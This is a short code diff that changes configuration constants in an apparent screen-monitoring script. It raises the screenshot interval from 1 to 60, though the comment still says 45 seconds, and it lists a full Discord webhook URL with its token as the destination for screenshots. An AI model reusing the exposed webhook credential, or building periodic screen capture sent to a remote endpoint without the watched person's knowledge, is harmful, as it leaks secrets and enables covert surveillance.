@@ -15,7 +15,7 @@ DISCORD_WEBHOOKS = [
     "https://discord.com/api/webhooks/1464318888714961091/dElHOxtS91PyvPZR3DQRcSNzD0di6vIlTr3qfHs-DUSEutmHxF9jEPJ7BMrWwhthbLf0"
 ]
 SEND_SCREENSHOTS = True  # Set to False to disable screenshot sending
-PERIODIC_SCREENSHOT_INTERVAL = 1  # Take screenshot every 45 seconds
+PERIODIC_SCREENSHOT_INTERVAL = 60  # Take screenshot every 45 seconds
 HEARTBEAT_INTERVAL = 300  # 5 minutes in seconds
 CPU_MONITOR_INTERVAL = 60  # Check CPU usage every 60 seconds
 
